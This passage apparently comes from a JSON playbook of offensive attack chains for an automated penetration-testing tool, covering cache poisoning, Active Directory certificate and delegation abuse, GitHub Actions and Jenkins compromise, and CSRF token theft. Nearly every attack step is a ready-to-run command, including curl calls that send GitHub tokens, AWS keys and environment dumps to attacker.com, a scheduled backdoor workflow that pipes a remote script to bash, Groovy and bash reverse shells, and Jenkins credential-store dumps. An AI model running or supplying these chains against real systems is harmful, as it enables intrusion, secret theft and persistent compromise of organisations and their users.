          "inline_command": "# Authenticated victim visits:\n#   https://target.com/profile/attacker.css\n# CDN sees \".css\" → treats as static → caches the response.\n# Origin still returns the profile page (path-traversal-style routing).\n# Attacker fetches:\ncurl '<url>/profile/anything.css'  # → victim's profile data!\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Variants per CDN:\n  /profile.css            ← match-any-suffix\n  /profile;foo.css        ← semicolon trick (AWS CloudFront)\n  /profile%2fimg.png      ← URL-encoded slash\n  /profile/..%2fimg.png   ← encoded traversal\nDocument.write the cookie too — get any sensitive data that the\norigin sent back.\n"
        },
        {
          "id": "poison_via_x_forwarded_host",
          "name": "Poison cache via unkeyed header (X-Forwarded-Host)",
          "inline_command": "# Many origins build absolute URLs from X-Forwarded-Host without\n# validating it. If that's reflected in the response AND not part of\n# the cache key:\ncurl '<url>/' -H 'X-Forwarded-Host: attacker.com'\n# Response includes: <script src=\"https://attacker.com/a.js\"></script>\n# Cache stores response keyed only by path → every subsequent user\n# gets your XSS.\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Param Miner (Burp extension) automatically discovers unkeyed headers.\nTest for each that reaches the origin: X-Forwarded-Host, X-Host,\nX-Original-URL, X-Rewrite-URL, X-Original-Forwarded-For.\n"
        },
        {
          "id": "cache_key_normalization",
          "name": "Cache key normalization quirks (path + query)",
          "inline_command": "# CDN may strip ?utm_* params for caching; attacker fetches:\ncurl '<url>/?utm_source=evil\"><script>fetch(\\\"http://attacker.com/?d=\\\"+document.cookie)</script>'\n# If the origin reflects the unstripped query in the body but the CDN\n# caches it under the stripped key → poisoned response to everyone.\n",
          "inputs": {
            "url": "${target_url}"
          }
        },
        {
          "id": "smuggle_then_cache",
          "name": "Request smuggling → poison shared cache",
          "inline_command": "# When front-end (CDN) and back-end disagree on Content-Length vs\n# Transfer-Encoding, you can smuggle a second request that the\n# back-end will treat as belonging to the NEXT user — and prefix it\n# with cache poisoning gadgets like:\n# GET /js/main.js HTTP/1.1\n# Host: target.com\n# X-Forwarded-Host: evil.com\n# → that response (with reflected evil.com) caches under /js/main.js\necho \"Use Burp HTTP Request Smuggler extension to detect + exploit.\"\n"
        },
        {
          "id": "cleanup_check",
          "name": "Confirm cache poisoning works AND check eviction",
          "inline_command": "# 1) Fire poison request.\n# 2) Wait 1 second.\n# 3) Fetch normally:\ncurl -I '<url>/' | head -10\n# Expect: Age > 0, X-Cache: HIT, and the body contains your payload.\n# 4) Track TTL — your poison lives until the cache evicts the entry.\n",
          "inputs": {
            "url": "${target_url}"
          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — Cache poisoning",
          "url": "https://portswigger.net/web-security/web-cache-poisoning"
        },
        {
          "title": "Cache deception (Omer Gil)",
          "url": "https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html"
        },
        {
          "title": "Param Miner",
          "url": "https://github.com/PortSwigger/param-miner"
        }
      ],
      "next_chains": [
        {
          "chain": "csrf-and-token-leak",
          "when": "poisoned response steals tokens",
          "reason": "Chain cache poisoning XSS with CSRF/token theft for full takeover."
        }
      ]
    },
    {
      "id": "certifried-cve-2022-26923",
      "name": "AD — Certifried (CVE-2022-26923) machine account DA",
      "description": "Any authenticated user with MachineAccountQuota>0 can create a computer object and set its dNSHostName to match a DC's dNSHostName. PKINIT then authenticates the attacker as that DC. Patched May 2022 but still in the wild on labs and unmanaged forests.\n",
      "tags": [
        "active-directory",
        "certifried",
        "cve-2022-26923",
        "priv-esc",
        "adcs"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "dc_hostname",
          "description": "DC dNSHostName (e.g. dc01.corp.local) — pulled from LDAP or nmap.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "precheck",
          "name": "Confirm MachineAccountQuota > 0",
          "command_ref": "nxc-ldap-maq",
          "inputs": {
            "dc-ip": "${dc_ip}"
          }
        },
        {
          "id": "create_attacker_computer",
          "name": "Create attacker computer object",
          "command_ref": "nxc-ldap-add-computer",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "attacker_computer",
              "regex": "Successfully added machine account ([A-Za-z0-9$]+) with password ([^\\s]+)",
              "match": "first",
              "groups": {
                "sam": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "spoof_dnshostname",
          "name": "Spoof attacker-computer dNSHostName to match the DC",
          "inline_command": "bloodyAD --host <dc-ip> -u '<user>' -p '<password>' -d '<domain>' \\\n  set object '<sam>' dNSHostName -v '<dc_hostname>'\n",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "domain": "${domain}",
            "dc_hostname": "${dc_hostname}"
          },
          "notes": "Must clear servicePrincipalName first (bloodyAD does this if you\npass `-v ''` to servicePrincipalName before setting dNSHostName).\n"
        },
        {
          "id": "request_machine_cert",
          "name": "Request a Machine cert as the spoofed host",
          "inline_command": "certipy req -u '<sam>@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -ca '<CA>' -template 'Machine'\n",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "domain": "${domain}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "The \"Machine\" template is enrollable by Domain Computers — your\nnewly-created account qualifies. Cert is issued for the spoofed\ndNSHostName (= DC).\n",
          "capture": [
            {
              "var": "dc_pfx",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_as_dc",
          "name": "PKINIT auth → DC machine-account NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "dc_pfx"
          ],
          "inputs": {
            "pfx_file": "${dc_pfx}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_machine_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dcsync",
          "name": "DCSync with the DC machine-account hash",
          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<DC_NAME>$@<dc-ip>' -just-dc",
          "inputs": {
            "hash": "${dc_machine_hash}",
            "dc-ip": "${dc_ip}",
            "domain": "${domain}"
          },
          "capture": [
            {
              "var": "krbtgt_nt_hash",
              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "Certifried (Will Schroeder)",
          "url": "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"
        },
        {
          "title": "CVE-2022-26923",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt_nt_hash captured",
          "reason": "krbtgt → Golden Ticket persistence."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_machine_hash captured",
          "reason": "Walk the domain with the DA-equivalent identity."
        }
      ]
    },
    {
      "id": "certipy-esc7-ca-manage",
      "name": "ADCS ESC7 — abuse Manage CA / Manage Certificates permission",
      "description": "When a low-priv principal has `Manage CA` or `Manage Certificates` rights on the CA itself (not just on a template), they can publish a new vulnerable template OR officer-approve a previously-denied request. Either way → domain takeover.\n",
      "tags": [
        "adcs",
        "esc7",
        "priv-esc",
        "certificates",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc7",
          "name": "Confirm Manage CA / Manage Certificates rights",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look at the CA section: `Permissions: Manage CA, Manage Certificates`\non your principal → ESC7. Note the CA name and the username.\n",
          "capture": [
            {
              "var": "ca_name",
              "regex": "\\[Certificate Authority\\][\\s\\S]*?CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "enable_template",
          "name": "Publish (re-enable) the SubCA template via Manage CA",
          "command_ref": "certipy-esc7",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "ca_name": "${ca_name}"
          },
          "notes": "Certipy's ESC7 path adds your principal as an officer of the CA, then\nrequests a SubCA certificate (which always allows SAN). Two-step\nautomatic. Watch for `[+] Certificate written to '<user>.pfx'`.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT auth → DA NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dcsync",
          "name": "Loot the domain",
          "command_ref": "secretsdump",
          "requires": [
            "dc_nt_hash"
          ]
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned — ESC7",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        },
        {
          "title": "Certipy ESC7",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "You hold the DA — Golden Ticket time."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Walk every server with the DA hash."
        }
      ]
    },
    {
      "id": "cicd-github-actions-secrets",
      "name": "CI/CD — GitHub Actions secret extraction (pwn_request / injection)",
      "description": "GitHub Actions workflows that use `pull_request_target`, run on attacker-controlled PRs, or expand untrusted input directly into shell commands all leak the repo's secrets. Common path: PR → workflow run → exfiltrate $GITHUB_TOKEN / cloud credentials.\n",
      "tags": [
        "cicd",
        "github-actions",
        "supply-chain",
        "secret-extraction"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "target_repo",
          "description": "GitHub repo to attack (https://github.com/org/repo).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enumerate_workflows",
          "name": "Enumerate workflows + their triggers",
          "inline_command": "gh repo clone <repo> /tmp/repo\ncd /tmp/repo\nls -la .github/workflows/\ngrep -l 'pull_request_target\\|workflow_run\\|issue_comment' .github/workflows/*.yml\n",
          "inputs": {
            "repo": "${target_repo}"
          },
          "notes": "Three risky triggers to look for:\n  pull_request_target — runs in trusted context with PR code!\n  workflow_run         — runs after a triggered workflow, with secrets\n  issue_comment        — runs on EVERY comment (incl. /commands)\n"
        },
        {
          "id": "pwn_request_vulnerable",
          "name": "Pwn request: workflow checks out PR head + runs build script",
          "inline_command": "grep -A20 'pull_request_target' .github/workflows/*.yml | grep -i 'checkout' -B5 -A5\n# Pattern to find:\n#   on: pull_request_target\n#   steps:\n#     - uses: actions/checkout@v4\n#       with:\n#         ref: ${{ github.event.pull_request.head.sha }}\n#     - run: npm install && npm test\n",
          "notes": "Combined with checkout(PR.head), `npm install` runs the PR's\npackage.json scripts in trusted context — full RCE with $GITHUB_TOKEN\nand any secrets the workflow injects.\n"
        },
        {
          "id": "craft_pr_payload",
          "name": "Craft the malicious PR (e.g. via package.json postinstall)",
          "inline_command": "# Fork the repo, create a branch, modify package.json:\njq '.scripts.postinstall = \"curl -X POST https://attacker.com/x -d \\\"$(env)\\\"\"' \\\n  package.json > package.json.new && mv package.json.new package.json\ngit commit -am 'add postinstall'\ngh pr create --title 'Fix typo' --body 'tiny fix' --base main\n",
          "notes": "Other gadgets:\n  - .github/workflows/<existing>.yml modification (if checkout uses PR ref)\n  - Makefile target overrides (if `make` runs in trusted context)\n  - GH-actions YAML expression injection in titles/comments: `${{ ... }}`\n"
        },
        {
          "id": "script_injection",
          "name": "Script injection via untrusted user input",
          "inline_command": "grep -E 'github\\.event\\.(pull_request\\.title|pull_request\\.body|issue\\.title|comment\\.body|head_commit\\.message)' .github/workflows/*.yml\n# If these appear in a `run:` step → ATTACK:\n# Set your PR title to:\n#   \"; curl -X POST https://attacker.com/x -d $(env | base64) ; #\"\n",
          "notes": "Especially common with `run: echo \"${{ github.event.pull_request.title }}\"`.\nInject shell metacharacters → arbitrary command execution in workflow.\n"
        },
        {
          "id": "exfil_secrets",
          "name": "Exfil the secrets you got access to",
          "inline_command": "# From inside the workflow run (your PR payload):\ncurl -X POST https://attacker.com/x -d \"GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}\"\ncurl -X POST https://attacker.com/x -d \"AWS=${{ secrets.AWS_ACCESS_KEY_ID }}:${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n# Or dump everything in env:\ncurl -X POST https://attacker.com/x --data-urlencode \"env=$(env)\"\n",
          "notes": "The GITHUB_TOKEN itself is scoped to the repo by default — but if\nthe workflow runs with `permissions: write-all` you can push to main,\ntag releases, delete the repo, even.\n"
        },
        {
          "id": "persistence_via_workflow",
          "name": "Persist via workflow modification",
          "inline_command": "# With write permissions, add a backdoor workflow:\ncat > .github/workflows/.maintenance.yml <<'EOF'\non:\n  schedule:\n    - cron: '*/15 * * * *'\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.com/payload.sh | bash\nEOF\ngit add . && git commit -am 'chore' && git push\n"
        }
      ],
      "references": [
        {
          "title": "GitHub Actions security (Adnan Khan)",
          "url": "https://www.praetorian.com/blog/github-actions-security-hardening/"
        },
        {
          "title": "Octoscan (workflow auditor)",
          "url": "https://github.com/synacktiv/octoscan"
        }
      ],
      "next_chains": [
        {
          "chain": "docker-registry-pillage",
          "when": "leaked Docker registry creds",
          "reason": "Pillage the org's images for more secrets."
        }
      ]
    },
    {
      "id": "cicd-jenkins-script-console",
      "name": "CI/CD — Jenkins script-console / build-step RCE",
      "description": "Jenkins is the gift that keeps giving. Default-config installations expose /script (Groovy console) to ANY authenticated user — instant RCE as the jenkins user, often with cloud / Git / SSH credentials in reach. Even when the console is locked down, the Pipeline DSL inside any job you can edit runs arbitrary Groovy.\n",
      "tags": [
        "cicd",
        "jenkins",
        "groovy",
        "rce",
        "post-exploitation"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "jenkins_url",
          "description": "Jenkins URL (often /jenkins/, port 8080).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enumerate_auth",
          "name": "Check auth strategy + anonymous access",
          "inline_command": "curl -s '<j>/asynchPeople/' | grep -oE 'href=\"/[^\"]+' | head\ncurl -s '<j>/script' | head\ncurl -s '<j>/api/json?pretty=true' | head -50\n",
          "inputs": {
            "j": "${jenkins_url}"
          },
          "notes": "Many Jenkins installs:\n - allow anonymous read\n - have signup ON by default\n - share weak admin password (admin/admin)\n - expose `/api/json` listing every job/build with users in tracebacks\n"
        },
        {
          "id": "script_console",
          "name": "RCE via /script Groovy console",
          "inline_command": "curl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=println \"id\".execute().text' \\\n  -d 'Submit=Run'\n",
          "inputs": {
            "j": "${jenkins_url}"
          },
          "notes": "Returns command stdout in the response page. Try first; if you get\n`Permission denied` you don't have Overall/RunScripts.\n"
        },
        {
          "id": "groovy_reverse_shell",
          "name": "Reverse shell from the console",
          "inline_command": "curl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=String host=\"<lhost>\"; int port=<lport>; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' \\\n  -d 'Submit=Run'\n",
          "inputs": {
            "j": "${jenkins_url}",
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        },
        {
          "id": "extract_credentials",
          "name": "Extract stored credentials (the real prize)",
          "inline_command": "# Once inside via shell or script console:\ncurl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=hudson.model.User.getById(\"admin\", false).getProperty(hudson.security.HudsonPrivateSecurityRealm.Details.class).getPasswordHash()' \\\n  -d 'Submit=Run'\n# Dump every credential in the credential store:\ncurl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each { c -> println(c.id + \": \" + c.getClass().getName() + \" => \" + (c.metaClass.respondsTo(c,\"getPassword\") ? c.password : (c.metaClass.respondsTo(c,\"getSecret\") ? c.secret : \"n/a\"))) }' \\\n  -d 'Submit=Run'\n",
          "inputs": {
            "j": "${jenkins_url}"
          },
          "notes": "Common loot:\n - AWS/Azure/GCP cloud-deploy keys\n - SSH keys for prod servers\n - Docker registry creds\n - GitHub PATs\n - API keys for downstream services\nEach one is an additional pivot — try them all.\n"
        },
        {
          "id": "pipeline_dsl_rce",
          "name": "If /script is locked: RCE via Pipeline DSL in any editable job",
          "inline_command": "# Job → Configure → Pipeline → Script. Paste:\nnode {\n  sh 'id; cat /var/lib/jenkins/secrets/master.key'\n  // Or full revshell:\n  sh 'bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"'\n}\n// → Build Now → RCE as jenkins user\n"
        },
        {
          "id": "pillage_workspace",
          "name": "Pillage workspaces for plain-text secrets",
          "inline_command": "find /var/lib/jenkins/jobs -name '*.xml' -exec grep -l 'password\\|secret\\|credentialsId' {} \\;\ncat /var/lib/jenkins/credentials.xml\n# Decrypt secrets with:\njava -jar ~/jenkins-decrypt.jar credentials.xml master.key hudson.util.Secret\n"
        }
      ],
      "references": [
        {
          "title": "Jenkins security best practices (Praetorian)",
          "url": "https://www.praetorian.com/blog/why-jenkins-is-still-an-attackers-easy-target/"
        },
        {
          "title": "HackTricks — Jenkins",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/8080-pentesting-jenkins.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize."
        },
        {
          "chain": "aws-imds-ssrf",
          "when": "Jenkins on EC2",
          "reason": "IMDS reachable from inside the build host — full cloud takeover."
        },
        {
          "chain": "docker-registry-pillage",
          "when": "Docker registry creds extracted",
          "reason": "Pillage container images."
        }
      ]
    },
    {
      "id": "constrained-delegation-s4u",
      "name": "AD — Constrained delegation S4U2self + S4U2proxy abuse",
      "description": "A computer or service account with msDS-AllowedToDelegateTo set on specific SPNs can ask the KDC for a ticket as ANY user to those SPNs (S4U2self + S4U2proxy). Often missed in BloodHound's \"shortest path\" paths.\n",
      "tags": [
        "delegation",
        "constrained-delegation",
        "s4u",
        "kerberos",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "delegating_principal",
          "description": "User or computer with msDS-AllowedToDelegateTo set.",
          "required": true
        },
        {
          "name": "delegating_password",
          "description": "Password OR NT hash of the delegating principal.",
          "required": true
        },
        {
          "name": "target_spn",
          "description": "SPN listed in msDS-AllowedToDelegateTo (e.g. cifs/dc01.corp.local).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enumerate_delegation",
          "name": "Find principals with constrained delegation set",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "Output lists `<principal>  Constrained  <spn1>;<spn2>;...`. Record\nthe SPN list — those are the only services you can ride into via\nS4U2proxy. Look for cifs/, host/, http/ — particularly if listed\nagainst a DC, you basically own the domain.\n"
        },
        {
          "id": "with_protocol_transition",
          "name": "S4U2self + S4U2proxy (with protocol transition)",
          "inline_command": "impacket-getST \\\n  -spn '<target_spn>' \\\n  -impersonate Administrator \\\n  -dc-ip <dc-ip> \\\n  '<domain>/<principal>:<password>'\n",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "principal": "${delegating_principal}",
            "password": "${delegating_password}",
            "target_spn": "${target_spn}"
          },
          "notes": "`TRUSTED_TO_AUTH_FOR_DELEGATION` (\"with protocol transition\") allows\nthe impersonation of ANY user even without an inbound TGT. If you\nsee only `TRUSTED_FOR_DELEGATION` (no protocol transition), this\nchain won't fly — use the unconstrained-delegation-printerbug chain\ninstead.\n",
          "capture": [
            {
              "var": "s4u_ccache",
              "regex": "Saving ticket in (\\S+\\.ccache)",
              "match": "first"
            }
          ]
        },
        {
          "id": "use_ticket",
          "name": "Use the forged ticket",
          "inline_command": "export KRB5CCNAME=<ccache>\nklist\n# If target_spn is cifs/<host>:\nimpacket-secretsdump -k -no-pass <host>\n# If host/<host>:\nimpacket-psexec -k -no-pass <host>\n",
          "inputs": {
            "ccache": "${s4u_ccache}"
          },
          "notes": "Each ticket is tied to ONE SPN. Need both cifs and host (psexec)?\nRe-run S4U2proxy for each SPN — or use krbrelayx to spray.\n"
        },
        {
          "id": "alt_protocol",
          "name": "No protocol transition? Try the Bronze Bit (CVE-2020-17049)",
          "inline_command": "impacket-getST -spn '<target_spn>' -impersonate Administrator -dc-ip <dc-ip> -force-forwardable '<domain>/<principal>:<password>'",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "principal": "${delegating_principal}",
            "password": "${delegating_password}",
            "target_spn": "${target_spn}"
          },
          "notes": "`-force-forwardable` exploits CVE-2020-17049. Patched on most modern\nDCs but lives on CTF/lab boxes for years.\n"
        }
      ],
      "references": [
        {
          "title": "Wagging the Dog (Constrained Delegation)",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        },
        {
          "title": "The Hacker Recipes — Constrained Delegation",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "when": "s4u_ccache + target is a server",
          "reason": "Loot the target with the forged ticket."
        },
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "target_spn covered the DC",
          "reason": "Domain-wide compromise → persistence."
        }
      ]
    },
    {
      "id": "csrf-and-token-leak",
      "name": "Web — CSRF + session/token leakage chain",
      "description": "CSRF lets you force an authenticated victim to perform actions; on its own it's auth-bypass-by-impersonation. Combined with a token leak (Referer header, XSS, postMessage origin checks) it becomes account takeover.\n",
      "tags": [
        "web",
        "csrf",
        "xss",
        "token-leak",
        "account-takeover"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_app",
          "description": "Base URL of the vulnerable app.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "csrf_probe",
          "name": "Identify state-changing endpoints + check CSRF protection",
          "inline_command": "# Find POST / PUT / DELETE endpoints with no CSRF token requirement.\n# Indicators: no X-CSRF-Token header, no SameSite cookie attribute,\n# no anti-CSRF input in forms.\ncurl -X POST '<app>/change-email' \\\n  -H 'Cookie: session=<victim_session_if_known>' \\\n  -d 'new_email=attacker@evil.com'\n",
          "inputs": {
            "app": "${target_app}"
          },
          "notes": "If state changes WITHOUT a corresponding token check → vulnerable.\n"
        },
        {
          "id": "craft_csrf_payload",
          "name": "Craft auto-submitting HTML CSRF payload",
          "inline_command": "cat > csrf.html <<'EOF'\n<html><body onload=\"document.forms[0].submit()\">\n<form action=\"<app>/change-email\" method=\"POST\">\n  <input name=\"new_email\" value=\"attacker@evil.com\">\n</form>\n</body></html>\nEOF\npython3 -m http.server 8080\n# Host on attacker box; lure victim to fetch http://<attacker>:8080/csrf.html.\n",
          "inputs": {
            "app": "${target_app}"
          },
          "notes": "Combine with XSS on a sibling host to remove the need for a click —\nauto-fires when the user visits ANY page on the compromised origin.\n"
        },
        {
          "id": "token_via_referer",
          "name": "Leak CSRF token via Referer header (open redirect)",
          "inline_command": "# Some apps put the token in the URL. Open redirect on the app:\ncurl '<app>/redirect?url=http://attacker.com'\n# The victim's browser sends Referer: <app>/page?csrf_token=XYZ\n# Capture in your access log.\n"
        },
        {
          "id": "token_via_xss",
          "name": "Leak token via XSS (any reflected XSS works)",
          "inline_command": "# Inject:\n# <script>\n# fetch('<app>/csrf-form').then(r=>r.text()).then(t=>{\n#   const tok = t.match(/csrf_token\\\\s*=\\\\s*\"([^\"]+)\"/)[1];\n#   fetch('http://attacker.com/?t=' + tok);\n# })\n# </script>\n"
        },
        {
          "id": "jwt_in_localstorage",
          "name": "JWT in localStorage → grab via XSS",
          "inline_command": "# <script>fetch('http://attacker.com/?t='+localStorage.getItem('jwt'))</script>\n# Stolen JWT → use directly in Authorization: Bearer header.\n# See the jwt-attacks chain to see if it can be forged anew.\n"
        },
        {
          "id": "account_takeover",
          "name": "Use captured token / changed email to fully take over",
          "inline_command": "# 1) Triggered email change → request password reset → land in attacker inbox.\ncurl -X POST '<app>/forgot-password' -d 'email=attacker@evil.com'\n# 2) Click the reset link → set new password → logged in as the victim.\n",
          "inputs": {
            "app": "${target_app}"
          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — CSRF",
          "url": "https://portswigger.net/web-security/csrf"
        },
        {
          "title": "HackTricks — CSRF",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html"
        }
      ],
      "next_chains": [
        {
          "chain": "file-upload-bypass",
          "when": "logged in as admin",
          "reason": "Admin panels usually expose uploads."
        },
        {
          "chain": "jwt-attacks",
          "when": "JWT stolen via XSS",
          "reason": "Try forging stronger tokens with the same secret."
        }
      ]
    },
    {
      "id": "dacl-genericall-abuse",
      "name": "AD — DACL abuse (GenericAll/Write/ForceChangePassword)",
      "description": "BloodHound shows you have GenericAll / GenericWrite / WriteDacl / ForceChangePassword on a target principal. Cash it in. Three common payoffs depending on the right: reset the password, add yourself to a group, or stage a shadow-credential.\n",
      "tags": [
        "dacl-abuse",
        "bloodhound",
        "priv-esc",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_principal",
          "description": "User/group/computer you have rights over.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_dacl",
          "name": "Confirm the ACE in BloodHound",
          "inline_command": "echo 'BloodHound query: MATCH p=(n {name:\"<USER>@<DOMAIN>\"}-[r:GenericAll|GenericWrite|WriteDacl|ForceChangePassword]->(m {name:\"<TARGET>@<DOMAIN>\"})) RETURN p'",
          "notes": "Pick the path based on what you have:\n • GenericAll on USER         → ForceChangePassword OR Shadow Creds\n • GenericWrite on USER       → Shadow Creds (msDS-KeyCredentialLink)\n • GenericAll on GROUP        → AddMember\n • GenericAll on COMPUTER     → Shadow Creds OR RBCD (see other chain)\n"
        },
        {
          "id": "read_dacl",
          "name": "Read DACL via NetExec to confirm",
          "command_ref": "nxc-ldap-daclread",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "branch_action",
          "branch": [
            {
              "when": "target_principal",
              "label": "Force password reset (if GenericAll/ForceChangePassword on a user)",
              "command_ref": "bloodyad-set-password"
            },
            {
              "when": "target_principal",
              "label": "Add user to a group (if GenericAll on the group)",
              "command_ref": "bloodyad-add-groupmember"
            },
            {
              "when": "target_principal",
              "label": "Shadow credentials (silent — preferred)",
              "command_ref": "bloodyad-shadow-credentials"
            }
          ]
        },
        {
          "id": "validate",
          "name": "Validate access with the new credential",
          "inline_command": "nxc smb <dc-ip> -u '<target_principal>' -p '<new_password>'",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "target_principal": "${target_principal}"
          },
          "notes": "Then either BloodHound the new identity for further paths, or jump\nto evil-winrm / secretsdump / kerberoast depending on the role.\n"
        }
      ],
      "references": [
        {
          "title": "BloodHound DACL edges",
          "url": "https://bloodhound.specterops.io/resources/edges/generic-all"
        },
        {
          "title": "bloodyAD",
          "url": "https://github.com/CravateRouge/bloodyAD"
        }
      ],
      "next_chains": [
        {
          "chain": "shadow-credentials",
          "reason": "Silent path when you have GenericAll/Write — usually safer than a password reset."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "new credential captured",
          "reason": "Spread the harvested identity."
        }
      ]
    },
    {
      "id": "deserialization-attacks",
      "name": "Web — Unsafe deserialization → RCE (Java / Python / .NET / PHP)",
      "description": "Application deserializes attacker-controlled blobs without integrity checks. Use a known gadget chain for the framework (ysoserial for Java, pickle for Python, ysoserial.net for .NET, phpggc for PHP) → RCE on unmarshal.\n",
      "tags": [
        "web",
        "deserialization",
        "rce",
        "java",
        "python",
        "dotnet",
        "php"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "target_url",
          "description": "Endpoint that consumes serialized data (often cookies, hidden inputs, message queues, API bodies).",
          "required": true
        }
